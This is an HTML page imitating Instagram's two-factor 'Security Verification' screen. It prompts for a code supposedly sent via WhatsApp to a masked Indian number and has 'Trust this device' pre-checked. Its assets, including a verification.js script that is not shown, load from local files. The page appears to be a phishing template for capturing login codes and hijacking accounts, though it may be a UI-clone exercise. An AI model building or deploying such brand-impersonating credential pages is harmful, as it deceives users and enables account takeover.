<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="stylesheet" href="./verification.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Security Verification - Instagram</title>
</head>
<body class="verification-page">
    <main class="verification-container">
        <div class="verification-box">
            <div class="lock-icon">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#0095f6" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
            </div>
            
            <h2>Enter the code we sent via WhatsApp to your mobile number: +91********</h2>
            
            <form id="verificationForm">
                <input type="text" id="securityCode" placeholder="Security Code" required>
                <button type="submit" id="confirmButton">Confirm</button>
            </form>
            
            <div class="trust-device">
                <input type="checkbox" id="trustDevice" checked>
                <label for="trustDevice">
                    <strong>Trust this device</strong><br>
                    We won't ask for a code next time
                </label>
            </div>
            
            <div class="alternative-options">
                <p>Didn't get a security code?</p>
                <a href="#" class="text-link">Send code via SMS instead</a>
                
                <p class="backup-text">If you're unable to receive a security code, use one of your <a href="#" class="text-link">backup codes</a>.</p>
            </div>
        </div>
    </main>
    <script src="./verification.js"></script>
</body>
</html>
